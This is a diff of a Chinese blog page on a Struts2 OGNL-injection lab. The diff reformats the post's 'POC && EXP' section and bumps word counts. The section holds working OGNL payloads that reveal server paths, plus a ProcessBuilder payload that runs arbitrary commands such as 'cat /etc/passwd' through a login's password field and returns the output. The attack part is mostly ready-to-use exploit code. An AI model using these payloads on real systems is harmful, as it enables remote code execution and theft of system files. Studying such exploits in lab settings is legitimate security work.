@@ -361,7 +361,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    455
+                    505
                 </div>
                 
 
@@ -384,8 +384,7 @@
 docker-compose up -d</code></pre><p><img src="https://s1.ax1x.com/2020/08/15/dFONdA.png" alt="dFONdA.png"></p>
 <h2 id="POC-amp-amp-EXP"><a href="#POC-amp-amp-EXP" class="headerlink" title="POC &amp;&amp; EXP"></a>POC &amp;&amp; EXP</h2><p>获取tomcat执行路径：</p>
 <pre><code>%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}</code></pre><p>获取Web路径：</p>
-<p>%{井号req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(“com.opensymphony.xwork2.dispatcher.HttpServletResponse”).getWriter(),#response.println(#req.getRealPath(‘/‘)),#response.flush(),#response.close()}</p>
-<blockquote>
+<pre><code>%{井号req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;/&#39;)),#response.flush(),#response.close()}</code></pre><blockquote>
 <p>查了一下，<code>{井号</code> 是 nunjucks 的注释标记， <a href="http://mozilla.github.io/nunjucks/templating.html#comments。" target="_blank" rel="noopener">http://mozilla.github.io/nunjucks/templating.html#comments。</a></p>
 <p>所以只有半个的话，就挂了。</p>
 <p>所以解决办法是 <code>{#</code> 但是这样 post 内容就不是纯的 markdown 了。</p>
@@ -393,10 +392,8 @@ docker-compose up -d</code></pre><p><img src="https://s1.ax1x.com/2020/08/15/dFO
 </blockquote>
 <p>任意命令执行:（命令加参数：<code>new java.lang.String[]{&quot;cat&quot;,&quot;/etc/passwd&quot;}</code>）</p>
 <p>将<code>new java.lang.String[]{&quot;pwd&quot;})</code>中的<code>pwd</code>替换为对应的命令，即可执行。</p>
-<p>%{井号a=(new java.lang.ProcessBuilder(new java.lang.String[]{“pwd”})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(</p>
-<p>再password处输入：</p>
-<p>%{井号a=(new java.lang.ProcessBuilder(new java.lang.String[]{“cat”,”/etc/passwd”})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(“com.opensymphony.xwork2.dispatcher.HttpServletResponse”),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</p>
-<p><img src="https://s1.ax1x.com/2020/08/15/dFOdit.png" alt="dFOdit.png"></p>
+<pre><code>%{井号a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;pwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre><p>再password处输入：</p>
+<pre><code>%{井号a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;cat&quot;,&quot;/etc/passwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre><p><img src="https://s1.ax1x.com/2020/08/15/dFOdit.png" alt="dFOdit.png"></p>
 <p>bp抓包看请求包信息</p>
 <p><img src="https://s1.ax1x.com/2020/08/15/dFO0Rf.png" alt="dFO0Rf.png"></p>
 <p>完。</p>
@@ -1045,7 +1042,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">29.7k</span>&nbsp;字
+                class="white-color">29.8k</span>&nbsp;字
             
             
             
